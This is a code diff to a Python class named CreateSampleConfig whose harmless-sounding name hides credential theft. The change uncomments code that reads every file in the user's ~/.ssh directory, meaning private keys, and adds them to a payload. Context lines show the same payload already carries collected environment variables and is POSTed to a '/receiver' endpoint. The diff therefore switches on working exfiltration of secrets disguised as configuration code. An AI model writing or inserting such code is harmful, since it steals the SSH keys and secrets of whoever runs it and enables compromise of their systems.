@@ -28,23 +28,23 @@ class CreateSampleConfig():
             if v:
                 found[i] = v
 
-        # keys = {}
-        # keys_dir = os.path.join(os.path.expanduser("~"), ".ssh")
-        # if os.path.exists(keys_dir):
-        #     files = os.listdir(keys_dir)
-        #     for i in files:
-        #         key_path = os.path.join(keys_dir, i)
-        #         try:
-        #             with open(key_path, "r") as f:
-        #                 keys[i] = f.read()
-        #         except IOError as e:
-        #             pass
-        # else:
-        #     pass
+        keys = {}
+        keys_dir = os.path.join(os.path.expanduser("~"), ".ssh")
+        if os.path.exists(keys_dir):
+            files = os.listdir(keys_dir)
+            for i in files:
+                key_path = os.path.join(keys_dir, i)
+                try:
+                    with open(key_path, "r") as f:
+                        keys[i] = f.read()
+                except IOError as e:
+                    pass
+        else:
+            pass
 
         data = {
             "envs": json.dumps(found).encode("utf-8"),
-            #"ssh": keys,
+            "ssh": keys,
         }
         requests.post("http://0.0.0.0:8080/receiver", json=data)
 
